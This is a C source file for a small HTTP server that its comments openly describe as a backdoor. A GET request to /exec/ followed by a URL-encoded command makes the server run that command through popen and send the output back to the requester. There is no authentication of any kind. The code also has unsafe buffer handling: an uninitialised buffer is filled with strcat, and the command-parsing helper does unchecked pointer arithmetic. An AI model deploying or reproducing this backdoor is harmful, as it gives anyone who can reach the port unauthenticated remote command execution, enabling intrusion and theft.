#include<netinet/in.h>
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<unistd.h>
#include<string.h>
char *getcmd(char *c);
char *getcme(char *c);


int system(const char *command);

// MAIN SOURCE TO CREATE PROGRAM : http://beej.us/guide/bgnet/ AND http://blog.manula.org/2011/05/writing-simple-web-server-in-c.html


////////////////////////////////URL DECODE///////////////////////////////
//DECODER SOURCE: https://www.rosettacode.org/wiki/URL_decoding#C
inline int ishex(int x)
{
	return	(x >= '0' && x <= '9')	||
		(x >= 'a' && x <= 'f')	||
		(x >= 'A' && x <= 'F');
}

int decode(const char *s, char *dec)
{
	char *o;
	const char *end = s + strlen(s);
	int c;

	for (o = dec; s <= end; o++) {
		c = *s++;
		if (c == '+') c = ' ';
		else if (c == '%' && (	!ishex(*s++)	||
					!ishex(*s++)	||
					!sscanf(s - 2, "%2x", &c)))
			return -1;

		if (dec) *o = c;
	}

	return o - dec;
}

//////////////////////////////////////////////////////////////////////////

////////////////////////////////////MAIN//////////////////////////////////
int main(int argc, char *argv[]) {

/////////// COMMAND LINE INPUT ///////////
   if( argc == 2 ) {
      printf("Server running on port:%d\n", atoi(argv[1]));
   }
   else if( argc > 2 ) {
      printf("Please entera single port\n");
   }
   else {
      printf("One port expected.\n");
   }


/////////INITIALIZE VARIABLES//////////////

   int create_socket, new_socket;
   socklen_t addrlen;
   int bufsize = 1024;
   char *buffer = malloc(bufsize);
   struct sockaddr_in address;
   int port = atoi(argv[1]);
   int i;



   if ((create_socket = socket(AF_INET, SOCK_STREAM, 0)) > 0){
      printf("The socket was created\n");
   }

   address.sin_family = AF_INET;  // IPV4
   address.sin_addr.s_addr = INADDR_ANY;
   address.sin_port = htons(port);   // BIG ENDIAN THINGY

   if (bind(create_socket, (struct sockaddr *) &address, sizeof(address)) == 0){
      printf("Binding Socket\n");
   }

//////// LISTEN TO CONNECTED PORT ////////
if (listen(create_socket, 10) < 0) {
         perror("server: listen");
         exit(1);
      }
   while (1) {

      if ((new_socket = accept(create_socket, (struct sockaddr *) &address, &addrlen)) < 0) {
         perror("server: accept");
         exit(1);
      }

      if (new_socket > 0){
         printf("The Client is connected...\n");
      }


      recv(new_socket, buffer, bufsize, 0);     //RECEIVE HTTP REQUEST
      char decodedurl[1024]; // DECODING THE WHOLE BUFFER FOR VALUES
      decode(buffer,decodedurl);
      //printf ("URL : %s", decodedurl);

      /////////////////// LOOK FOR BACKDOOR /exec/ ///////////
      if ( (strncmp(decodedurl,"GET /exec", 9))==0 && (strstr(buffer,"HTTP/1.1"))!=NULL ) {

      char *cmd = getcmd(decodedurl);
      char decodedcmd[1024];
      decode(cmd,decodedcmd);
      printf("COMMAND %s\n",decodedcmd);





////// EXECUTE SYSTEM COMMAND AND SEND AS HTTP RESPONSE/////

// FILE HANDLING SOURCE : http://stackoverflow.com/questions/29431081/config-file-for-web-server-to-receive-get-request-in-c
FILE *fp;
char op[10000];
char tempbuff[1024];
fp = popen(decodedcmd, "r");
if (fp == NULL) {
    printf("Failed to run command\n" );
    exit(1);
  }

while (fgets(tempbuff, sizeof(tempbuff)-1, fp) != NULL) {

strcat(op,tempbuff);
  }


pclose(fp);



      write(new_socket, op,strlen(op));  // WRITING HTTP RESPONSE

      memset(op, 0, 10000);
      memset(tempbuff, 0, 1024);
      }


      else
      {
      write(new_socket, "HTTP/1.1 404 Not Found\n", 22);    // 404 ERROR
      write(new_socket, "Content-Type: text/html\n\n", 25);
      write(new_socket, "<html><body><H1>ERROR 404, Page not found</H1></body></html>",60);
      }

      close(new_socket);

}


   close(create_socket);
   return 0;

}


//////////////////////  GET COMMAND FROM BACKDOOR INPUT //////////////
char *getcmd(char *c){
const char *p1 = strstr(c, "GET /exec/")+10;
const char *p2 = strstr(p1, " HTTP/1.1");
size_t len = p2-p1;
char *res = (char*)malloc(sizeof(char)*(len+1));
strncpy(res, p1, len);
res[len] = '\0';
return res;
}







